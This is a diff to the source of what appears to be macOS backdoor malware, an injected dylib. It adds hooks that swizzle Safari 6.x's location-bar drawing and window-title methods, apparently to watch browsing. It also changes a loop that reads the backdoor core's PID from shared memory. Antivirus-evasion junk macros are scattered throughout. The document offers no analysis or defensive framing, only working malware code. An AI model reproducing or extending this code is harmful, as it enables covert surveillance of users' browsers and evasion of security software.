@@ -803,6 +803,39 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           
           // AV evasion: only on release build
           AV_GARBAGE_000
+          
+          /*
+           * for Safari 6.x only
+           */
+          Class LocationTextFieldClass = objc_getClass("LocationTextField");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          Class BrowserWindowClass = objc_getClass("BrowserWindow");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleByAddingIMP (LocationTextFieldClass, @selector(_drawTopLocationTextField:),
+                                class_getMethodImplementation(classSource, @selector(_drawTopLocationTextFieldHook:)),
+                                @selector(_drawTopLocationTextFieldHook:));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleByAddingIMP (BrowserWindowClass, @selector(setTitle:),
+                                class_getMethodImplementation(classSource, @selector(setTitleHook:)),
+                                @selector(setTitleHook:));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_005
+          }
         }
       }
       else
@@ -945,6 +978,38 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           
           // AV evasion: only on release build
           AV_GARBAGE_002
+          
+          /*
+           * for Safari 6.x only
+           */
+          Class LocationTextFieldClass = objc_getClass("LocationTextField");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          Class BrowserWindowClass = objc_getClass("BrowserWindow");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleMethod(LocationTextFieldClass, @selector(_drawTopLocationTextField:),
+                          LocationTextFieldClass, @selector(_drawTopLocationTextFieldHook:));
+
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleMethod(BrowserWindowClass, @selector(setTitle:),
+                          BrowserWindowClass, @selector(setTitleHook:));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_005
+          }
+
         }
       }
       else
@@ -2359,56 +2424,54 @@ if ([mSharedMemoryCommand createMemoryRegion] == -1)
   verboseLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
 #endif
   
-  // On leopard we get pid on shmem
+  // Get pid on shmem
   // waiting till core write it...
-  if ([gUtil isLeopard])
-  {
-    while (TRUE)
+  while (TRUE)
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_007 
+
+    readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
+                                  fromComponent: COMP_AGENT];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009 
+
+    if (readData != nil)
     {   
       // AV evasion: only on release build
-      AV_GARBAGE_007 
+      AV_GARBAGE_006 
 
-      readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
-                                    fromComponent: COMP_AGENT];
+      shMemCommand = (shMemoryCommand *)[readData bytes];
       
       // AV evasion: only on release build
-      AV_GARBAGE_009 
+      AV_GARBAGE_005 
 
-      if (readData != nil)
+#ifdef DEBUG_INPUT_MANAGER
+      verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
+#endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
+      if (shMemCommand->command == CR_CORE_PID)
       {   
         // AV evasion: only on release build
-        AV_GARBAGE_006 
+        AV_GARBAGE_008 
 
-        shMemCommand = (shMemoryCommand *)[readData bytes];
+        memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
         
-        // AV evasion: only on release build
-        AV_GARBAGE_005 
-
 #ifdef DEBUG_INPUT_MANAGER
-        verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
+        verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
 #endif
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_002 
-
-        if (shMemCommand->command == CR_CORE_PID)
-        {   
-          // AV evasion: only on release build
-          AV_GARBAGE_008 
-
-          memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
-#ifdef DEBUG_INPUT_MANAGER
-          verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
-#endif
-          break;
-        }
+        break;
       }
-      
-      // AV evasion: only on release build
-      AV_GARBAGE_009
-
-      usleep(30000);
     }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+
+    usleep(30000);
   }
   
   // AV evasion: only on release build
